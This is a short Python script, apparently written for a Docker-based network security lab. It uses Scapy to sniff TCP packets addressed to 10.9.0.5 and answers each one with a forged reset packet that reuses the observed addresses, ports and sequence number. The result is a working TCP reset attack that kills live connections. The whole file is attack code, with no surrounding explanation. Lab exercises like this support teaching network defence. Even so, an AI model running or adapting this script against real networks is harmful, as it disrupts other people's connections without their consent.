#!usr/bin/env python3
from scapy.all import *
import subprocess

# The following two lines are used to automatically get the name of the interface used for docker
# If it does not work, you can simply set it manually
cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True,
                       universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()

def send_reset(pkt):
	"""
	Given a sniffed packet, send a rst packet with the correct information
	"""
	src_ip = pkt[IP].src
	dst_ip = pkt[IP].dst
	src_port = pkt[TCP].sport
	dst_port = pkt[TCP].dport
	ack = pkt[TCP].ack
	seq = pkt[TCP].seq

	ip = IP(src=src_ip, dst=dst_ip)
	tcp = TCP(sport=src_port, dport=dst_port, flags='RA', seq=seq+1)

	rst = ip/tcp
	send(rst, verbose=0, iface=IFACE)

def main():
	# Sniffing exchanged packets
	print('[+] Sniffing...')
	pkt = sniff(iface=IFACE, filter='tcp and dst host 10.9.0.5', prn=send_reset)

if __name__ == '__main__':
	main()
